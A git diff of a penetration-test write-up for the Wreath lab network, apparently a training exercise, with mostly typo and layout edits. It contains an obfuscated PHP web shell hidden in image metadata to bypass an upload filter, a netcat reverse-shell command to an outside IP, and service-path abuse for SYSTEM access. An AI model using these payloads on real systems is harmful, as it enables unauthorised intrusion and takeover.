@@ -295,9 +295,11 @@ Within the index.php was a funciton that allowed file uploads (thus a potential 
 ![Screenshot 2023-06-07 142906](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/474b67e9-ee3d-4d5f-b15f-30ffd1951dab)
 
 
-Navigating to the site within the browser reveals a login page but luckily I managed to crack Thomas' password hash earlier and was granted access:
+Navigating to the site within the browser reveals a login page but luckily I managed to crack Thomas' password from the hash retrieved earlier and was granted access:
 
 ![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/0023cd21-39f7-42e5-bcff-1ae85a2baf77)
+
+## Personal Pc Exploitation
 
 Now I had to find someway to take advantage of the upload function.
 
@@ -313,6 +315,7 @@ if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
 
 ```
 `[1]` retrieves the second element from the array, which represents the file extension.
+
 `in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)` checks if the file extension exists in the `$goodExts` array and if the extension is not found in the array the file is not uploaded.
 
 Indeed, a legitmate image had to be uploaded so I used exiftool to allow me to place php shell code into the image metadata.
@@ -332,19 +335,17 @@ Eg :
 
 Becomes:
 
-``` <?php \$u0=\$_GET[base64_decode('ZnJvc3Q=')];if(isset(\$u0)){echo base64_decode('PHByZT4=').shell_exec(\$u0).base64_decode('PC9wcmU+');}die();?> ```
+` <?php \$u0=\$_GET[base64_decode('ZnJvc3Q=')];if(isset(\$u0)){echo base64_decode('PHByZT4=').shell_exec(\$u0).base64_decode('PC9wcmU+');}die();?> `
 
-After exiftool to embed the payload into the image, uploading it and navigating to it via URL, we can see that command execution is available.
+After exiftool to embed the payload into the image, uploading it and navigating to it via URL (resources/uploads/frost.jpg.php), we can see that command execution is available.
 
 `systeminfo`:
 
 ![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f8f2434a-de84-439d-a920-fc1e39b90a92)
 
 
-## Personal Pc Exploitation
-
 The next step involved obtaining a full reverse shell from the web shell.
-I uploaded a static netcat binary (https://github.com/int0x33/nc.exe/) to the server via a local python webserver and uesd powershell to set up the connection:
+I uploaded a static netcat binary (https://github.com/int0x33/nc.exe/) to the server via a local python webserver and used powershell to set up the connection:
 
 ` powershell.exe c:\\windows\\temp\\nc-USERNAME.exe 10.10.146.80 12345 -e cmd.exe `
 
@@ -385,9 +386,10 @@ The wrapper is as follows (you can see that `ProcessStartInfo` runs the binary a
 ![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/0a0626ef-6d47-4b80-a95a-8d28ba677d1a)
 
 I then compiled and uploaded to the machine (I used the python server again).
-Finally, I copied the script to ` C:\Program Files (x86)\System Explorer\System.exe` , started a local listener and then stopped and started the service on the compromised machine:
+Finally, I copied the script to `C:\Program Files (x86)\System Explorer\System.exe` , started a local listener and then stopped and started the service on the compromised machine:
 
 ` sc stop SystemExplorerHelpService `
+
 ` sc start SystemExplorerHelpService `
 
 Listener:
@@ -396,6 +398,8 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
+
+All 3 machines were now fully under my control.
 
 ![Screenshot 2023-06-07 140706](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/213952a3-a4af-471f-8aa2-f306c02fea69)
 
